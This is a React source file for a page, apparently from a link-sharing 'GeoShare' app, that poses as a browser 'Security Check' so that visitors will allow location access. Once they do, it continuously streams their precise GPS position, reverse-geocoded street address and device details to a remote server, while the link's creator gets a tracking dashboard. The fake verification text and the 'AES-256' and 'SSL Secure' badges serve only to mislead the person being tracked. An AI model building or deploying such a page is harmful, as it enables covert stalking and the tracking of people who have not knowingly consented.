import React, { useState, useEffect, useRef } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { getSession, updateLocation } from '../services/api';
import { ShieldCheck, MapPin, Navigation, Info, AlertTriangle } from 'lucide-react';
import io from 'socket.io-client';

const SharePage = () => {
    const { sessionId } = useParams();
    const navigate = useNavigate();
    const [session, setSession] = useState(null);
    const [loading, setLoading] = useState(true);
    const [sharing, setSharing] = useState(false);
    const [error, setError] = useState(null);
    const [location, setLocation] = useState(null);
    const socketRef = useRef(null);
    const watchIdRef = useRef(null);
    const lastUpdateRef = useRef(0);

    useEffect(() => {
        // Check if this session was created by the current user
        const saved = localStorage.getItem('geoShare_sessions');
        if (saved) {
            const sessions = JSON.parse(saved);
            if (sessions.some(s => s.sessionId === sessionId)) {
                navigate(`/dashboard/${sessionId}`);
                return;
            }
        }

        const fetchSession = async () => {
            try {
                const { data } = await getSession(sessionId);
                setSession(data.session);
                // Trigger auto-sharing after session is verified
                autoStartSharing();
            } catch (err) {
                setError('Invalid or expired tracking link.');
            } finally {
                setLoading(false);
            }
        };
        fetchSession();

        // Connect to socket for real-time updates
        const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
        const socketUrl = (!isLocalhost && import.meta.env.PROD) 
            ? 'https://trackers-oplf.onrender.com' 
            : (import.meta.env.VITE_SOCKET_URL || 'http://localhost:5000');
        socketRef.current = io(socketUrl);
        socketRef.current.emit('join-session', sessionId);

        return () => {
            if (watchIdRef.current) navigator.geolocation.clearWatch(watchIdRef.current);
            if (socketRef.current) socketRef.current.disconnect();
        };
    }, [sessionId]);

    const autoStartSharing = () => {
        if (!navigator.geolocation) {
            setError("Geolocation is not supported by your browser.");
            return;
        }

        setError(null);
        setSharing(true);

        watchIdRef.current = navigator.geolocation.watchPosition(
            async (position) => {
                const { latitude, longitude, accuracy } = position.coords;
                const locData = {
                    sessionId,
                    latitude,
                    longitude,
                    accuracy,
                    deviceInfo: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform
                    }
                };

                setLocation(locData);
                
                // Throttle: Only send to server once every 5 seconds
                const now = Date.now();
                if (now - lastUpdateRef.current < 5000) return;
                lastUpdateRef.current = now;

                try {
                    // 1. Get Address Details from client side (more reliable than server)
                    let address = {};
                    try {
                        const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`, {
                            headers: { 'User-Agent': `GeoShare-User-${sessionId.substring(0, 8)}` }
                        });
                        const geoData = await geoRes.json();
                        if (geoData && geoData.address) {
                            const addr = geoData.address;
                            address = {
                                village: addr.village || addr.suburb || addr.neighbourhood || addr.residential || addr.road || 'N/A',
                                city: addr.city || addr.town || addr.municipality || addr.county || 'N/A',
                                pincode: addr.postcode || 'N/A',
                                state: addr.state || addr.state_district || 'N/A',
                                country: addr.country || 'N/A',
                                fullAddress: geoData.display_name
                            };
                        }
                    } catch (e) {
                        console.error('Geocoding error:', e);
                    }

                    // 2. Send to API with address
                    await updateLocation(sessionId, { ...locData, address });
                } catch (err) {
                    console.error('Failed to sync location:', err);
                }
            },
            (err) => {
                console.error(err);
                setSharing(false);
                if (err.code === 1) {
                    setError("Security Check Failed: Please ALLOW location access to view this message.");
                } else if (err.code === 3) {
                    setError("Connection Timeout: Your GPS signal is weak. Please move to an open area and try again.");
                } else {
                    setError("Verification Failed: Please ensure your device GPS is ON and you have granted permission.");
                }
            },
            {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            }
        );
    };

    if (loading) return (
        <div className="flex flex-col items-center justify-center min-h-screen bg-white font-sans p-4">
            <div className="w-12 h-12 md:w-16 md:h-16 border-4 border-slate-200 border-t-blue-500 rounded-full animate-spin mb-6"></div>
            <p className="text-slate-700 text-base md:text-lg font-medium">Checking your browser...</p>
        </div>
    );

    return (
        <div className="min-h-screen bg-[#0a0a0a] text-white flex items-center justify-center p-4 md:p-6 font-sans">
            <div className="max-w-xl w-full">
                {/* Security Header */}
                <div className="text-center mb-8 md:mb-10">
                    <div className="inline-flex items-center justify-center w-16 h-16 md:w-20 md:h-20 bg-blue-600/10 border border-blue-500/20 rounded-full mb-4 md:mb-6 animate-pulse">
                        <ShieldCheck size={32} className="text-blue-500 md:w-10 md:h-10" />
                    </div>
                    <h1 className="text-xl md:text-2xl font-bold mb-2 tracking-tight">Security Check Required</h1>
                    <p className="text-slate-400 text-sm md:text-base px-4">This content is protected. Please verify your browser to continue.</p>
                </div>

                <div className="bg-[#111] border border-white/5 rounded-3xl p-6 md:p-10 shadow-2xl relative overflow-hidden">
                    {/* Progress Bar */}
                    <div className="absolute top-0 left-0 w-full h-1 bg-white/5">
                        <div className="h-full bg-blue-600 transition-all duration-1000" style={{ width: sharing ? '100%' : '30%' }}></div>
                    </div>

                    {error ? (
                        <div className="space-y-6 text-center py-4 md:py-6">
                            <div className="w-16 h-16 bg-red-500/10 border border-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                                <AlertTriangle className="text-red-500" size={32} />
                            </div>
                            <h2 className="text-lg md:text-xl font-bold text-red-400">Action Required</h2>
                            <p className="text-slate-400 text-sm leading-relaxed px-2">
                                {error}
                            </p>
                            
                            <div className="bg-white/5 border border-white/10 rounded-2xl p-4 md:p-6 text-left space-y-4">
                                <h3 className="text-xs font-black uppercase tracking-widest text-slate-500 flex items-center gap-2">
                                    <Info size={14} /> How to fix:
                                </h3>
                                <div className="space-y-3 text-xs md:text-sm text-slate-300">
                                    <div className="flex gap-3">
                                        <div className="flex-shrink-0 w-5 h-5 bg-blue-600 rounded-full flex items-center justify-center text-[10px] font-bold">1</div>
                                        <p>Ensure <b>Location/GPS</b> is turned ON in your phone settings.</p>
                                    </div>
                                    <div className="flex gap-3">
                                        <div className="flex-shrink-0 w-5 h-5 bg-blue-600 rounded-full flex items-center justify-center text-[10px] font-bold">2</div>
                                        <p>Refresh this page and click <b>"Allow"</b> when prompted.</p>
                                    </div>
                                    <div className="flex gap-3">
                                        <div className="flex-shrink-0 w-5 h-5 bg-blue-600 rounded-full flex items-center justify-center text-[10px] font-bold">3</div>
                                        <p>If blocked, click the <b>lock icon</b> in the address bar and reset permissions.</p>
                                    </div>
                                </div>
                            </div>

                            <button 
                                onClick={() => window.location.reload()}
                                className="w-full py-3 md:py-4 bg-white text-black font-bold rounded-xl hover:bg-slate-200 transition-all text-sm md:text-base"
                            >
                                Try Again
                            </button>
                        </div>
                    ) : (
                        <div className="space-y-8 text-center py-4">
                            {!sharing ? (
                                <>
                                    <div className="space-y-4">
                                        <div className="flex items-center justify-center gap-3 text-blue-500">
                                            <Navigation className="animate-bounce" size={24} />
                                            <span className="text-[10px] md:text-xs font-black uppercase tracking-[0.3em]">System Ready</span>
                                        </div>
                                        <p className="text-slate-300 text-sm md:text-base px-2">
                                            Please complete the verification to access the shared message.
                                        </p>
                                    </div>
                                    <button 
                                        onClick={() => window.location.reload()}
                                        className="group relative w-full py-4 md:py-5 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-2xl transition-all shadow-[0_0_40px_rgba(37,99,235,0.3)] flex items-center justify-center gap-3 overflow-hidden"
                                    >
                                        <ShieldCheck size={20} />
                                        <span className="text-sm md:text-base">Verify & Access Message</span>
                                    </button>
                                </>
                            ) : (
                                <div className="space-y-6 animate-pulse">
                                    <div className="flex flex-col items-center gap-6">
                                        <div className="relative">
                                            <div className="w-16 h-16 md:w-20 md:h-20 border-4 border-blue-600/20 border-t-blue-600 rounded-full animate-spin"></div>
                                            <div className="absolute inset-0 flex items-center justify-center">
                                                <MapPin className="text-blue-600" size={24} />
                                            </div>
                                        </div>
                                        <div className="space-y-2">
                                            <p className="text-blue-500 font-bold text-sm md:text-base tracking-widest uppercase">Verification in progress</p>
                                            <p className="text-slate-500 text-[10px] md:text-xs">Connecting to secure server... Please stay on this page.</p>
                                        </div>
                                    </div>
                                </div>
                            )}
                        </div>
                    )}
                </div>

                <div className="mt-8 md:mt-10 grid grid-cols-3 gap-4 md:gap-6 opacity-30 grayscale pointer-events-none">
                    <div className="flex flex-col items-center gap-2">
                        <ShieldCheck size={20} />
                        <span className="text-[8px] md:text-[10px] uppercase font-bold tracking-tighter">AES-256</span>
                    </div>
                    <div className="flex flex-col items-center gap-2 border-x border-white/10">
                        <ShieldCheck size={20} />
                        <span className="text-[8px] md:text-[10px] uppercase font-bold tracking-tighter">SSL Secure</span>
                    </div>
                    <div className="flex flex-col items-center gap-2">
                        <ShieldCheck size={20} />
                        <span className="text-[8px] md:text-[10px] uppercase font-bold tracking-tighter">Verified</span>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default SharePage;
